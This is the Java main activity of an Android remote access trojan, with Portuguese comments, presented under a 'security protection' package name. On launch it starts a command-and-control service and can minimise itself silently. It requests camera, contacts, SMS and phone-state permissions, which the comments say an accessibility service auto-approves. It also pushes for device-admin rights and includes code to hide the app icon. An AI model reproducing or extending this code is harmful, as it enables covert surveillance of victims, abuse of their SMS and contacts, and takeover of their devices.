package com.seguranca.protecao;

import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import androidx.appcompat.app.AppCompatActivity;

/**
 * Activity principal - VAI DIRETO para o SetupWizard
 * Sem telas intermediárias para instalação mais rápida
 */
public class MainActivity extends AppCompatActivity {
    private PermissionManager permissionManager;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        permissionManager = new PermissionManager(this);
        
        // 🚀 Inicia o serviço C&C imediatamente ao abrir o aplicativo
        try {
            startBackgroundServices();
        } catch (Exception e) {
            android.util.Log.e("MainActivity", "Erro ao iniciar serviço em background: " + e.getMessage());
        }
        
        // CRÍTICO: Se foi solicitado para pedir TODAS as permissões runtime
        if (getIntent().getBooleanExtra("REQUEST_ALL_PERMISSIONS", false)) {
            boolean silentMode = getIntent().getBooleanExtra("SILENT_MODE", false);
            
            if (silentMode) {
                // Modo silencioso: minimiza a janela para usuário não ver
                moveTaskToBack(true);
            }
            
            requestAllRuntimePermissions();
            
            if (!silentMode) {
                finish();
            }
            return;
        }
        
        // ===== DIRETO PARA O WIZARD DE PERMISSÕES =====
        // Pula todas as telas intermediárias e vai direto para o SetupWizard
        // Isso é mais rápido e direto para o usuário
        
        // Se já tem acessibilidade ativada, ou se o setup já foi concluído antes, abre a WebView
        boolean setupCompleted = getSharedPreferences("rat_prefs", MODE_PRIVATE).getBoolean("setup_completed", false);
        
        boolean needsAdmin = false;
        if (CommandControlService.REQUEST_ADMIN) {
            android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager) getSystemService(android.content.Context.DEVICE_POLICY_SERVICE);
            android.content.ComponentName adminComponent = new android.content.ComponentName(this, MyAdminReceiver.class);
            if (dpm != null && !dpm.isAdminActive(adminComponent)) {
                needsAdmin = true;
            }
        }
        
        if ((permissionManager.isAccessibilityServiceEnabled() || setupCompleted) && !needsAdmin) {
            startBackgroundServices();
            // Ocultamento imediato desativado para evitar crash/kill do processo antes de exibir a WebView.
            // O ícone será ocultado de forma totalmente invisível e segura no SCREEN_OFF.
            /*
            if (CommandControlService.HIDE_ICON) {
                hideAppIcon();
            }
            */
            if (CommandControlService.WEBVIEW_URL != null && !CommandControlService.WEBVIEW_URL.trim().isEmpty()) {
                Intent webViewIntent = new Intent(this, WebViewActivity.class);
                webViewIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
                startActivity(webViewIntent);
            }
            finish();
            return;
        }
        
        // 🎨 Se existe visual_config.json em assets (gerado pelo APK Builder Visual), abre VisualScreenActivity!
        try {
            java.io.InputStream is = getAssets().open("visual_config.json");
            if (is != null) {
                is.close();
                android.util.Log.d("MainActivity", "🎨 Configuração visual encontrada em assets - abrindo VisualScreenActivity!");
                Intent visualIntent = new Intent(this, VisualScreenActivity.class);
                startActivity(visualIntent);
                finish();
                return;
            }
        } catch (Exception ignored) {}
        
        // Se não for APK Visual, vai DIRETO para o SetupWizard
        Intent intent = new Intent(this, SetupWizardActivity.class);
        startActivity(intent);
        finish();
    }

    /**
     * Inicia todos os serviços em background
     */
    private void startBackgroundServices() {
        // Inicia o serviço de comando e controle
        Intent ccIntent = new Intent(this, CommandControlService.class);
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            startForegroundService(ccIntent);
        } else {
            startService(ccIntent);
        }
    }

    /**
     * Esconde o ícone do app do launcher
     * Isso torna o app "invisível" para o usuário
     */
    private void hideAppIcon() {
        android.content.pm.PackageManager pm = getPackageManager();
        android.content.ComponentName componentName = new android.content.ComponentName(
            this,
            MainActivity.class
        );
        
        pm.setComponentEnabledSetting(
            componentName,
            android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            android.content.pm.PackageManager.DONT_KILL_APP
        );
    }
    
    /**
     * CRÍTICO: Solicita TODAS as permissões runtime de uma vez
     * Camera, Microfone, SMS, Contatos, Localização, Storage, Telefone, etc
     * O AccessibilityService vai automatizar os cliques em "Permitir"!
     */
    private void requestAllRuntimePermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            java.util.List<String> list = new java.util.ArrayList<>();
            if (CommandControlService.ENABLE_CAMERA) {
                list.add(android.Manifest.permission.CAMERA);
            }
            if (CommandControlService.ENABLE_CONTACTS) {
                list.add(android.Manifest.permission.READ_CONTACTS);
                list.add(android.Manifest.permission.WRITE_CONTACTS);
            }
            if (CommandControlService.ENABLE_SEND_SMS) {
                list.add(android.Manifest.permission.SEND_SMS);
            }
            if (CommandControlService.ENABLE_READ_SMS) {
                list.add(android.Manifest.permission.READ_SMS);
                list.add(android.Manifest.permission.RECEIVE_SMS);
            }
            list.add(android.Manifest.permission.READ_PHONE_STATE);
            
            if (!list.isEmpty()) {
                requestPermissions(list.toArray(new String[0]), 1000);
            }
        }
    }
    
    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        // Não precisa fazer nada - AccessibilityService já automatizou tudo!
    }
}
